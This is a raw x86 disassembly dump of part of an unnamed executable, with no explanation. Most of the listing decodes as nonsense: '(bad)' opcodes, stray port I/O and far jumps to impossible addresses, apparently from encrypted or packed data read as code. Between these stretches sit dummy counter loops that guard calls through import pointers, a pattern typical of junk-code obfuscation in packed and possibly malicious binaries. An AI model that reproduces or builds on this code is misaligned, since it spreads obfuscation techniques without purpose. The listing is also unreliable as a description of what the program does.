  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	cmp    eax,0x61c29872
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	sbb    eax,0xcac869f4
  40edb0:	xor    eax,0x81aa7a64
  40edb5:	ss jns 0x40ed69
  40edb8:	xor    BYTE PTR [eax-0x35],0xf9
  40edbc:	mov    cl,BYTE PTR [edx+0x3bd360e3]
  40edc2:	call   0x1449686e
  40edc7:	cmp    dh,dl
  40edc9:	fld    DWORD PTR [edx-0x7e]
  40edcc:	push   ds
  40edcd:	jmp    0x74d0e77d
  40edd2:	push   ebx
  40edd3:	cmp    BYTE PTR [esi+ecx*1],bl
  40edd6:	loopne 0x40edf2
  40edd8:	mov    BYTE PTR [ebp-0x28],al
  40eddb:	inc    ecx
  40eddc:	mov    esp,0x2da444fb
  40ede1:	pusha  
  40ede2:	mov    DWORD PTR [ecx-0x31885754],ebp
  40ede8:	or     dh,BYTE PTR [eax]
  40edea:	cmc    
  40edeb:	test   al,0x6b
  40eded:	sbb    BYTE PTR [ebp+0x79459fb1],bh
  40edf3:	push   ebp
  40edf4:	jno    0x40ed8b
  40edf6:	mov    eax,0xc478e7ca
  40edfb:	fldenv [ebp-0x2c]
  40edfe:	adc    eax,ebp
  40ee00:	push   edx
  40ee01:	loope  0x40ee6f
  40ee03:	mov    ebx,0x873f9d3e
  40ee08:	arpl   WORD PTR [ecx+0x36d7b5da],di
  40ee0e:	sbb    esi,esi
  40ee10:	xlat   BYTE PTR ds:[ebx]
  40ee11:	repz in eax,0xe1
  40ee14:	outs   dx,DWORD PTR ds:[esi]
  40ee15:	push   edx
  40ee16:	iret   
  40ee17:	es jmp 0x40edc8
  40ee1a:	xchg   esi,eax
  40ee1b:	dec    ebp
  40ee1c:	adc    bh,BYTE PTR [edx]
  40ee1e:	add    BYTE PTR [ebx+0x72],al
  40ee21:	and    eax,0x53618c3a
  40ee26:	adc    ah,BYTE PTR [eax]
  40ee28:	mov    DWORD PTR [ecx+0xc519e97],0x908baafd
  40ee32:	mov    ecx,0x47146b92
  40ee37:	add    dh,BYTE PTR [ebx]
  40ee39:	xchg   esp,eax
  40ee3a:	xor    bh,cl
  40ee3c:	add    DWORD PTR [edi-0x4],esi
  40ee3f:	loope  0x40ee2e
  40ee41:	in     al,dx
  40ee42:	jnp    0x40ee9a
  40ee44:	sub    edx,DWORD PTR [esi]
  40ee46:	xchg   esi,ebp
  40ee48:	aaa    
  40ee49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee4a:	dec    edi
  40ee4b:	adc    ah,ah
  40ee4d:	xor    eax,0x9ddb2d35
  40ee52:	ins    DWORD PTR es:[edi],dx
  40ee53:	jnp    0x40eea2
  40ee55:	cdq    
  40ee56:	ret    0x3c3f
  40ee59:	data16 mov ds,WORD PTR [edi]
  40ee5c:	add    bh,BYTE PTR [ebp-0x12]
  40ee5f:	int3   
  40ee60:	xchg   ebp,eax
  40ee61:	xchg   ebx,eax
  40ee62:	loope  0x40ee36
  40ee64:	rcl    BYTE PTR [edx-0x65],0x53
  40ee68:	mov    ah,0x57
  40ee6a:	ret    
  40ee6b:	mov    ebp,0x341ef87a
  40ee70:	xor    bh,dh
  40ee72:	mov    bh,0x8e
  40ee74:	js     0x40ee57
  40ee76:	aad    0xcb
  40ee78:	repz and BYTE PTR cs:[esi-0x3e0f1ee7],ch
  40ee80:	retf   0x4198
  40ee83:	or     al,0x30
  40ee85:	xor    DWORD PTR [ebp-0x4d],0xffffffd6
  40ee89:	arpl   WORD PTR [edi-0x54c5f01c],ax
  40ee8f:	jge    0x40eec2
  40ee91:	push   edi
  40ee92:	div    DWORD PTR [ecx+0x65]
  40ee95:	icebp  
  40ee96:	fdiv   st,st(1)
  40ee98:	inc    ecx
  40ee99:	nop
  40ee9a:	xchg   BYTE PTR [esi],bl
  40ee9c:	jmp    0xec5c89fc
  40eea1:	inc    ebp
  40eea2:	xchg   edx,eax
  40eea3:	popa   
  40eea4:	mov    al,0x9d
  40eea6:	dec    edi
  40eea7:	xor    DWORD PTR ds:0xf9c08bef,esi
  40eead:	das    
  40eeae:	push   eax
  40eeaf:	mov    esi,0x63b21ae5
  40eeb4:	mov    bl,0x10
  40eeb6:	pop    esp
  40eeb7:	popa   
  40eeb8:	jbe    0x40eeab
  40eeba:	arpl   WORD PTR [edi+0x25f789f7],bx
  40eec0:	jb     0x40eee1
  40eec2:	stos   BYTE PTR es:[edi],al
  40eec3:	or     DWORD PTR [eax-0x5],ebx
  40eec6:	out    dx,al
  40eec7:	add    ch,ch
  40eec9:	xor    BYTE PTR [edx-0x38b0c329],bl
  40eecf:	ins    BYTE PTR es:[edi],dx
  40eed0:	repz in al,dx
  40eed2:	push   ebx
  40eed3:	xor    edi,DWORD PTR [eax+esi*1]
  40eed6:	imul   edx,DWORD PTR [edi*2+0x22f15fc7],0x8bc19c04
  40eee1:	bound  esp,QWORD PTR ds:0x940d90aa
  40eee7:	xchg   ebx,eax
  40eee8:	mov    esi,0x4b53c327
  40eeed:	int    0x9a
  40eeef:	dec    ecx
  40eef0:	push   ebx
  40eef1:	mov    ah,0xae
  40eef3:	es ret 
  40eef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eef6:	inc    ecx
  40eef7:	daa    
  40eef8:	lods   al,BYTE PTR ds:[esi]
  40eef9:	pop    es
  40eefa:	push   ss
  40eefb:	outs   dx,BYTE PTR ds:[esi]
  40eefc:	add    DWORD PTR [eax],edx
  40eefe:	and    ah,cl
  40ef00:	test   esi,esp
  40ef02:	call   0x36f:0x96e23f37
  40ef09:	imul   DWORD PTR [ecx+0x1e]
  40ef0c:	xchg   ecx,eax
  40ef0d:	xchg   esi,eax
  40ef0e:	ja     0x40ee9d
  40ef10:	cmp    al,0xed
  40ef12:	outs   dx,BYTE PTR ds:[esi]
  40ef13:	inc    eax
  40ef14:	cdq    
  40ef15:	or     dh,bl
  40ef17:	std    
  40ef18:	xlat   BYTE PTR ds:[ebx]
  40ef19:	adc    eax,0x56850daf
  40ef1e:	into   
  40ef1f:	mov    edi,0xd116978f
  40ef24:	icebp  
  40ef25:	stos   BYTE PTR es:[edi],al
  40ef26:	add    DWORD PTR [ecx-0x4b],edi
  40ef29:	sub    DWORD PTR [ebp-0x30],0x3f0da8fc
  40ef30:	xchg   ebp,eax
  40ef31:	xlat   BYTE PTR ds:[ebx]
  40ef32:	mov    ebx,0xc2ffcb4e
  40ef37:	ror    BYTE PTR [edi],1
  40ef39:	push   0xac2f20c9
  40ef3e:	shr    BYTE PTR [ebx+eiz*2+0x18aee8a4],0x8c
  40ef46:	stc    
  40ef47:	imul   eax,eax,0xd331edf2
  40ef4d:	mov    al,ds:0x978f144d
  40ef52:	xchg   edi,eax
  40ef53:	call   0xaa0e:0x49a33fe0
  40ef5a:	out    dx,eax
  40ef5b:	shl    DWORD PTR [ecx+0x58],0xd5
  40ef5f:	xor    dh,dl
  40ef61:	mov    ecx,0x84071afc
  40ef66:	pop    esi
  40ef67:	out    dx,al
  40ef68:	stos   DWORD PTR es:[edi],eax
  40ef69:	add    ebx,DWORD PTR ds:0x858062e0
  40ef6f:	jge    0x40efe9
  40ef71:	(bad)  
  40ef72:	cmp    ebp,DWORD PTR [ebp+0x1732ebe7]
  40ef78:	inc    ebp
  40ef79:	dec    eax
  40ef7a:	cmp    eax,0x58353f1c
  40ef7f:	push   ecx
  40ef80:	pop    edi
  40ef81:	dec    esi
  40ef82:	pop    ecx
  40ef83:	pop    edx
  40ef84:	sub    ch,BYTE PTR [ebx+0x7f]
  40ef87:	popf   
  40ef88:	pop    ebx
  40ef89:	cld    
  40ef8a:	inc    ecx
  40ef8b:	enter  0xad77,0x50
  40ef8f:	outs   dx,BYTE PTR ds:[esi]
  40ef90:	test   ax,0x81b5
  40ef95:	clc    
  40ef96:	ins    DWORD PTR es:[edi],dx
  40ef97:	pop    esp
  40ef98:	mov    bh,0x44
  40ef9a:	sub    ebx,DWORD PTR [eax+0x3]
  40ef9d:	retf   0x4849
  40efa0:	sub    eax,0x52fea5f9
  40efa5:	fistp  WORD PTR [ebx]
  40efa7:	dec    esi
  40efa8:	repz xchg esp,eax
  40efaa:	jecxz  0x40efc8
  40efac:	in     eax,dx
  40efad:	mov    ds:0xc20f0d6a,eax
  40efb2:	push   ss
  40efb3:	xchg   ebx,eax
  40efb4:	and    eax,DWORD PTR [ebp*4+0x952ffbe]
  40efbb:	add    BYTE PTR [ecx+0x6d],ah
  40efbe:	sub    BYTE PTR [edi-0x67609437],ah
  40efc4:	sbb    dh,BYTE PTR [eax+0x3e]
  40efc7:	(bad)  
  40efc8:	sub    esi,DWORD PTR [ebp-0x1899ac47]
  40efce:	outs   dx,DWORD PTR ds:[esi]
  40efcf:	setl   BYTE PTR [edi+eax*1]
  40efd3:	test   DWORD PTR [eax+0x66],0xdcde6900
  40efda:	sahf   
  40efdb:	jp     0x40ef9d
  40efdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efde:	mov    bl,0xcb
  40efe0:	jmp    0xc944833d
  40efe5:	inc    edi
  40efe6:	mov    ebx,0xff0a177
  40efeb:	cdq    
  40efec:	sbb    eax,0x202c31bc
  40eff1:	aaa    
  40eff2:	xchg   DWORD PTR [edi+ecx*4],eax
  40eff5:	xchg   edi,edi
  40eff7:	xchg   edx,eax
  40eff8:	or     BYTE PTR [ebx-0x25],0x5b
  40effc:	dec    ebp
  40effd:	xor    al,dl
  40efff:	scas   al,BYTE PTR es:[edi]
  40f000:	jp     0x40f054
  40f002:	or     al,0x90
  40f004:	ins    BYTE PTR es:[edi],dx
  40f005:	addr16 gs das 
  40f008:	fstp   TBYTE PTR ds:0xe582e6b0
  40f00e:	shl    dl,1
  40f010:	xchg   esi,eax
  40f011:	push   0xffffffc9
  40f013:	mov    dl,0x9f
  40f015:	mov    eax,ds:0x81f85589
  40f01a:	and    eax,0x42a801
  40f01f:	add    BYTE PTR [eax],al
  40f021:	add    BYTE PTR [eax],al
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a801
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a801,edi
  40f032:	cmp    DWORD PTR ds:0x42a801,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a801,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a801
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a801,edi
  40f066:	cmp    DWORD PTR ds:0x42a801,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a88d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a88d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a88d,edi
  40f08f:	cmp    DWORD PTR ds:0x42a88d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a805
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a88d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a759,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0x63
  40f0d7:	popf   
  40f0d8:	(bad)  
  40f0da:	into   
  40f0db:	mov    esp,0x7ee57878
  40f0e0:	js     0x40f15a
  40f0e2:	out    0x45,eax
  40f0e4:	(bad)  
  40f0e7:	sub    dh,BYTE PTR [ecx+0x8]
  40f0ea:	sbb    al,0x90
  40f0ec:	cli    
  40f0ed:	es ret 0x6ab2
  40f0f1:	repz repz fisub WORD PTR [ebx+0x14e4797]
  40f0f9:	lods   al,BYTE PTR ds:[esi]
  40f0fa:	fsub   DWORD PTR [edx+esi*8]
  40f0fd:	popa   
  40f0fe:	fild   WORD PTR [ebp-0x8]
  40f101:	std    
  40f102:	sbb    al,0x7d
  40f105:	fidiv  DWORD PTR [ecx+0x7f]
  40f108:	mov    ebp,0x9fb077df
  40f10d:	add    cl,BYTE PTR [ecx-0x6061efd0]
  40f113:	pop    edi
  40f114:	sub    DWORD PTR [ebp+0x51807a23],0xffffff8a
  40f11b:	push   0xa6f611a6
  40f120:	std    
  40f121:	jg     0x40f19c
  40f123:	jp     0x40f0c5
  40f125:	lock sub DWORD PTR [ebx-0x3f4db345],esp
  40f12c:	aaa    
  40f12d:	or     DWORD PTR [ecx+eax*2+0x73],edi
  40f131:	inc    esp
  40f132:	repz pop ecx
  40f134:	pop    ecx
  40f135:	mov    esp,edx
  40f137:	xchg   edx,eax
  40f138:	xlat   BYTE PTR ds:[ebx]
  40f139:	fadd   DWORD PTR [ecx+0x74e05706]
  40f13f:	xor    DWORD PTR [ebp-0x6cf13a40],eax
  40f145:	retf   0xe1e2
  40f148:	fcmovnb st,st(0)
  40f14a:	repnz in eax,dx
  40f14c:	inc    ecx
  40f14d:	add    ecx,0xffffffb9
  40f150:	adc    eax,0x97ad7093
  40f155:	mov    al,0xf0
  40f157:	jg     0x40f17e
  40f159:	cwde   
  40f15a:	mov    ebx,0xed7824c8
  40f15f:	mov    bl,bh
  40f161:	add    BYTE PTR [esi-0x33],dl
  40f164:	pop    ds
  40f165:	(bad)  
  40f166:	xlat   BYTE PTR ds:[ebx]
  40f167:	(bad)  [esi]
  40f169:	mov    ds:0x3d1fd5da,eax
  40f16e:	daa    
  40f16f:	dec    esi
  40f170:	pop    eax
  40f171:	ja     0x40f168
  40f173:	dec    esi
  40f174:	add    DWORD PTR [edi-0x61],esp
  40f177:	and    ah,bl
  40f179:	push   edi
  40f17a:	add    ebp,0x35
  40f17d:	in     al,dx
  40f17e:	xchg   DWORD PTR ds:0x3f09ff1e,ecx
  40f184:	ins    BYTE PTR es:[edi],dx
  40f185:	out    0xbd,al
  40f187:	mov    ds:0x1b79e899,al
  40f18c:	test   BYTE PTR [eax+0x5e],cl
  40f18f:	aam    0xf7
  40f191:	shl    DWORD PTR [ecx+0x5b],1
  40f194:	inc    esi
  40f195:	retf   0xbbe9
  40f198:	push   ebp
  40f199:	fidivr DWORD PTR [eax+0x29]
  40f19c:	js     0x40f195
  40f19e:	test   DWORD PTR [eax+0x5be5d03a],ecx
  40f1a4:	mov    ebp,0xda8cf57
  40f1a9:	mov    bl,0x11
  40f1ab:	iret   
  40f1ac:	mov    ebp,0xad2c92f2
  40f1b1:	xor    BYTE PTR [eax-0x1e404bae],al
  40f1b7:	pop    edx
  40f1b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b9:	scas   eax,DWORD PTR es:[edi]
  40f1ba:	test   eax,0x64bcc4bb
  40f1bf:	lods   al,BYTE PTR ds:[esi]
  40f1c0:	test   al,0xab
  40f1c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1c3:	jle    0x40f168
  40f1c5:	sbb    ebp,0xffffff97
  40f1c8:	pop    ds
  40f1c9:	push   ds
  40f1ca:	leave  
  40f1cb:	imul   DWORD PTR ds:0x63e34bcc
  40f1d1:	pop    ds
  40f1d2:	jge    0x40f181
  40f1d4:	mov    es,WORD PTR [edx-0x32e61921]
  40f1da:	push   eax
  40f1db:	dec    edi
  40f1dc:	fs jo  0x40f186
  40f1df:	retf   
  40f1e0:	cmp    bh,BYTE PTR [edx-0x9b9f9cc]
  40f1e6:	popf   
  40f1e7:	inc    BYTE PTR [ebx]
  40f1e9:	inc    ebp
  40f1ea:	lods   eax,DWORD PTR ds:[esi]
  40f1eb:	mov    DWORD PTR [edx+0x21],esi
  40f1ee:	pop    es
  40f1ef:	aam    0xa2
  40f1f1:	jle    0x40f22e
  40f1f3:	mov    ebx,0x33e2f48c
  40f1f8:	mov    ds,WORD PTR [esi-0x1140e6c0]
  40f1fe:	in     al,dx
  40f1ff:	adc    al,0xec
  40f201:	adc    al,BYTE PTR [edx-0x792d8397]
  40f207:	into   
  40f208:	ins    DWORD PTR es:[edi],dx
  40f209:	jmp    0x85e0:0xcdeb061f
  40f210:	and    DWORD PTR [edi-0x6417c870],esp
  40f216:	fs pop eax
  40f218:	ret    0xd33c
  40f21b:	xchg   edi,eax
  40f21c:	mov    esp,0x93ab4631
  40f221:	inc    esp
  40f222:	add    DWORD PTR [eax],esi
  40f224:	cmp    esi,edx
  40f226:	mov    DWORD PTR [ecx+0x54214536],edi
  40f22c:	arpl   WORD PTR [edi+0x46b628b0],bx
  40f232:	lods   al,BYTE PTR ds:[esi]
  40f233:	sbb    bl,bl
  40f235:	inc    BYTE PTR [esp+eiz*8]
  40f238:	adc    dl,cl
  40f23a:	xor    al,0xb0
  40f23c:	cs out 0x11,al
  40f23f:	push   edi
  40f240:	and    ch,BYTE PTR [ebx+eiz*2]
  40f243:	and    ecx,DWORD PTR [edx-0x44af652b]
  40f249:	xor    ch,BYTE PTR [ebx+0x34bce041]
  40f24f:	mov    esp,0x50cd695d
  40f254:	fnstenv [ecx+0x28]
  40f257:	push   0x4a7357fb
  40f25c:	stc    
  40f25d:	jle    0x40f20b
  40f25f:	stc    
  40f260:	outs   dx,BYTE PTR ds:[esi]
  40f261:	dec    ecx
  40f262:	push   cs
  40f263:	cmp    DWORD PTR [edx+0x65],esp
  40f266:	pop    ss
  40f267:	mov    bl,0xab
  40f269:	(bad)  
  40f26a:	pop    ebx
  40f26b:	icebp  
  40f26c:	push   edx
  40f26d:	inc    eax
  40f26e:	(bad)  
  40f270:	mov    ds:0x4f7d8d56,eax
  40f275:	push   edx
  40f276:	mov    DWORD PTR [esi+0x721914de],esi
  40f27c:	cli    
  40f27d:	int    0x5b
  40f27f:	loope  0x40f253
  40f281:	xor    dl,dh
  40f283:	mov    cl,0xf5
  40f285:	sub    ecx,edx
  40f287:	sbb    BYTE PTR ds:0x30513f9e,al
  40f28d:	ins    BYTE PTR es:[edi],dx
  40f28e:	retf   0xfccd
  40f291:	push   esp
  40f292:	or     BYTE PTR [edx],dl
  40f294:	imul   DWORD PTR [bx-0x1d3e]
  40f299:	repz mov edx,0xef32896d
  40f29f:	shr    DWORD PTR [ebp+0x4a403b5b],cl
  40f2a5:	stc    
  40f2a6:	(bad)  
  40f2a7:	(bad)  
  40f2a8:	mov    ecx,DWORD PTR ss:[ebp+0x34]
  40f2ac:	aad    0x32
  40f2ae:	(bad)  [esi+0x59]
  40f2b1:	inc    edx
  40f2b2:	mov    cl,0x26
  40f2b4:	xor    DWORD PTR [ebp+eiz*2-0x3c],eax
  40f2b8:	(bad)
  40f2bb:	aas    
  40f2bc:	xor    eax,ebx
  40f2be:	fs push 0x5d
  40f2c1:	push   ds
  40f2c2:	mov    esp,0x98b7ae63
  40f2c7:	pop    DWORD PTR [ebx+0x7a]
  40f2ca:	dec    eax
  40f2cb:	cmp    DWORD PTR [esi+0x64],eax
  40f2ce:	loop   0x40f328
  40f2d0:	or     BYTE PTR [eax+0x727b160d],bh
  40f2d6:	sub    cl,cl
  40f2d8:	mov    esi,0x2cb1f740
  40f2dd:	fs pop ss
  40f2df:	inc    dh
  40f2e1:	xor    BYTE PTR [ebp+edi*8+0x1c182220],dl
  40f2e8:	xor    DWORD PTR [ecx-0x32],esi
  40f2eb:	sti    
  40f2ec:	lods   eax,DWORD PTR ds:[esi]
  40f2ed:	in     eax,dx
  40f2ee:	push   0xffffffef
  40f2f0:	shl    DWORD PTR [edx],1
  40f2f2:	stc    
  40f2f3:	inc    edx
  40f2f4:	fldcw  WORD PTR cs:[ecx+0x1b]
  40f2f8:	jecxz  0x40f339
  40f2fa:	jns    0x40f2ff
  40f2fc:	sub    al,0x86
  40f2fe:	out    0x51,al
  40f300:	mov    bl,0xc5
  40f302:	sti    
  40f303:	mov    DWORD PTR [ebp-0x780acf95],0xfa889342
  40f30d:	lods   eax,DWORD PTR ds:[esi]
  40f30e:	test   DWORD PTR [edx+0x42],0x388d9009
  40f315:	pop    ebp
  40f316:	stos   BYTE PTR es:[edi],al
  40f317:	into   
  40f318:	jmp    0x668c:0xe1079230
  40f31f:	sub    DWORD PTR [eax-0x3a],edx
  40f322:	sub    al,0xeb
  40f324:	add    al,0x43
  40f326:	sub    al,0xfd
  40f328:	xchg   dh,dh
  40f32a:	mov    bh,BYTE PTR [edi+0x60a2e3d8]
  40f330:	sub    eax,0xb0f080e8
  40f335:	popa   
  40f336:	rol    BYTE PTR [eax+edx*8-0x6c],cl
  40f33a:	test   al,0xd6
  40f33c:	xchg   edi,eax
  40f33d:	test   eax,0x24700a63
  40f342:	and    esp,esi
  40f344:	add    al,0x2c
  40f346:	retf   0x1379
  40f349:	adc    al,0x59
  40f34b:	jg     0x40f2e1
  40f34d:	add    edx,ecx
  40f34f:	mov    DWORD PTR ds:0x42a80d,0x1d
  40f359:	cmp    DWORD PTR ds:0x42a80d,0x0
  40f360:	je     0x40f3c3
  40f366:	cmp    DWORD PTR ds:0x42a80d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a80d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a80d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a80d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a80d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a80d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a759
  40f3bd:	add    DWORD PTR ds:0x42a775,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a769
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a841,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a841
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a841,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a841,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a841,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a879
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a775,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a809,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a809
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a809,edx
  40f477:	cmp    DWORD PTR ds:0x42a809,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a809,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7c9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7c9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7c9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7c9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7c9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a841,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a841
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a841,edi
  40f528:	cmp    DWORD PTR ds:0x42a841,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a841,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7cd
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a831,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	shl    DWORD PTR [esi+ebx*4-0x1f],0x58
  40f575:	mov    ebx,0xe5787842
  40f57a:	jle    0x40f5f4
  40f57c:	js     0x40f582
  40f57e:	lock push 0xf7b67487
  40f584:	or     edi,DWORD PTR [edx+0xf35ead3]
  40f58a:	jecxz  0x40f5b2
  40f58c:	mov    ds:0x6a50e701,eax
  40f591:	or     BYTE PTR [edx+0x51f67913],dh
  40f597:	push   edi
  40f598:	lock cmp DWORD PTR [edx+0x13],ebp
  40f59c:	leave  
  40f59d:	stos   DWORD PTR es:[edi],eax
  40f59e:	or     dl,BYTE PTR [ebx+0x4c3da236]
  40f5a4:	outs   dx,DWORD PTR ds:[esi]
  40f5a5:	fisubr WORD PTR [edx-0x7f916d79]
  40f5ab:	adc    cl,bl
  40f5ad:	ja     0x40f60d
  40f5af:	sub    al,0xf1
  40f5b1:	popw   ds
  40f5b3:	popf   
  40f5b4:	mov    eax,0x51e7e75f
  40f5b9:	push   es
  40f5ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5bb:	lds    edx,FWORD PTR [edi]
  40f5bd:	pop    edi
  40f5be:	push   es
  40f5bf:	iret   
  40f5c0:	retf   0xf345
  40f5c3:	fimul  DWORD PTR [ebp-0x36]
  40f5c6:	xor    edx,0x42
  40f5c9:	pushf  
  40f5ca:	xchg   ebp,eax
  40f5cb:	adc    BYTE PTR [ecx],bh
  40f5cd:	pop    ebp
  40f5ce:	push   ds
  40f5cf:	jno    0x40f58c
  40f5d1:	(bad)  
  40f5d2:	mov    eax,ds:0x45180b9f
  40f5d7:	scas   al,BYTE PTR es:[edi]
  40f5d8:	sbb    cl,BYTE PTR [esi-0x68fb78c4]
  40f5de:	xchg   edx,esp
  40f5e0:	sbb    al,0x17
  40f5e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5e3:	mov    al,0x72
  40f5e5:	sahf   
  40f5e6:	push   eax
  40f5e7:	pushf  
  40f5e8:	mov    ebx,0x66399f24
  40f5ed:	sahf   
  40f5ee:	cmp    eax,0xf920011e
  40f5f3:	loopne 0x40f5d6
  40f5f5:	(bad)  
  40f5f6:	pop    edx
  40f5f7:	push   eax
  40f5f8:	ins    DWORD PTR es:[edi],dx
  40f5f9:	ins    DWORD PTR es:[edi],dx
  40f5fa:	sahf   
  40f5fb:	dec    esi
  40f5fc:	inc    ebp
  40f5fd:	test   dh,al
  40f5ff:	pop    eax
  40f600:	cld    
  40f601:	adc    DWORD PTR [edx],0xffffffaa
  40f604:	int    0xec
  40f606:	ja     0x40f627
  40f608:	fs retf 0x8c4f
  40f60c:	aaa    
  40f60d:	and    BYTE PTR [ecx],bh
  40f60f:	sub    eax,eax
  40f611:	sub    DWORD PTR [edx],edi
  40f613:	test   eax,0x7971283a
  40f618:	and    ah,BYTE PTR [eax+edi*1-0x7a]
  40f61c:	sar    DWORD PTR [ebp-0x4b5b7a7],cl
  40f622:	shl    DWORD PTR [ebx-0xb],1
  40f625:	and    DWORD PTR [esi-0x3ba3559a],ebp
  40f62b:	add    BYTE PTR [esp+ebp*2],al
  40f62e:	inc    eax
  40f62f:	inc    esp
  40f630:	addr16 inc eax
  40f632:	mov    ds:0x3ca0ed84,al
  40f637:	in     al,dx
  40f638:	cmp    ebx,DWORD PTR [edx+0x3d01bed0]
  40f63e:	jb     0x40f670
  40f640:	in     al,dx
  40f641:	test   DWORD PTR [ebx-0x52],esp
  40f644:	jnp    0x40f5cf
  40f646:	jo     0x40f689
  40f648:	jnp    0x40f6b2
  40f64a:	xlat   BYTE PTR ds:[ebx]
  40f64b:	and    DWORD PTR ds:0xb6977321,esp
  40f651:	sbb    bl,BYTE PTR [edi+ecx*2]
  40f654:	mov    eax,ds:0x97ed6041
